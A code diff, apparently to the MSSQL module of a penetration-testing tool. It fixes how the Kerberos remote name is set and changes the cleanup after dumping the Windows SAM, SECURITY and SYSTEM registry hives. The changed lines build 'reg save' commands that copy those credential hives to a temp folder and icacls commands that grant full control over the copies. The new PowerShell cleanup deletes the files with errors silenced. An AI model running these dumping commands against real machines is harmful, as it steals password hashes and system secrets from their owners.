@@ -153,6 +153,7 @@ class mssql(connection):
             self.logger.info(f"Failed to receive NTLM challenge, reason: {e!s}")
             return False
         else:
+            self.remoteName = self.host
             if challenge.startswith(b"NTLMSSP\x00"):
                 ntlm_info = parse_challenge(challenge)
                 dns_hostname = ntlm_info["dns_hostname"] or ""
@@ -160,6 +161,7 @@ class mssql(connection):
                 domain = ntlm_info["domain"] or (dns_hostname.split(".", 1)[1] if "." in dns_hostname else self.host)
                 self.hostname = sanitize_dns(hostname, self.logger)
                 self.targetDomain = self.domain = sanitize_dns(domain, self.logger)
+                self.remoteName = sanitize_dns(dns_hostname, self.logger) if self.kerberos else self.host
                 self.server_os = ntlm_info["os_version"]
                 self.logger.extra["hostname"] = self.hostname
             else:
@@ -174,8 +176,6 @@ class mssql(connection):
             self.domain = self.args.domain
         if self.args.local_auth:
             self.domain = self.hostname
-
-        self.remoteName = self.host if not self.kerberos else f"{self.hostname}.{self.domain}"
 
         if not self.kdcHost and self.domain:
             result = self.resolver(self.domain)
@@ -572,7 +572,8 @@ class mssql(connection):
         sam_storename = gen_random_string(6)
         system_storename = gen_random_string(6)
         dump_command = f"reg save HKLM\\SAM C:\\windows\\temp\\{sam_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
-        clean_command = f"del C:\\windows\\temp\\{sam_storename} && del C:\\windows\\temp\\{system_storename}"
+        # del must list C:\windows\temp, which the SQL service account may not be allowed to do; Remove-Item -LiteralPath does not need to
+        clean_command = f"powershell -NoProfile -Command Remove-Item -LiteralPath C:\\windows\\temp\\{sam_storename},C:\\windows\\temp\\{system_storename} -Force -ErrorAction SilentlyContinue"
         get_owner_command = f"icacls C:\\windows\\temp\\{sam_storename} /grant {self.username}:F && icacls C:\\windows\\temp\\{system_storename} /grant {self.username}:F"
         output_filename = self.output_file_template.format(output_folder="sam")
         try:
@@ -607,7 +608,8 @@ class mssql(connection):
         security_storename = gen_random_string(6)
         system_storename = gen_random_string(6)
         dump_command = f"reg save HKLM\\SECURITY C:\\windows\\temp\\{security_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
-        clean_command = f"del C:\\windows\\temp\\{security_storename} && del C:\\windows\\temp\\{system_storename}"
+        # del must list C:\windows\temp, which the SQL service account may not be allowed to do; Remove-Item -LiteralPath does not need to
+        clean_command = f"powershell -NoProfile -Command Remove-Item -LiteralPath C:\\windows\\temp\\{security_storename},C:\\windows\\temp\\{system_storename} -Force -ErrorAction SilentlyContinue"
         get_owner_command = f"icacls C:\\windows\\temp\\{security_storename} /grant {self.username}:F && icacls C:\\windows\\temp\\{system_storename} /grant {self.username}:F"
         output_filename = self.output_file_template.format(output_folder="lsa")
         try:
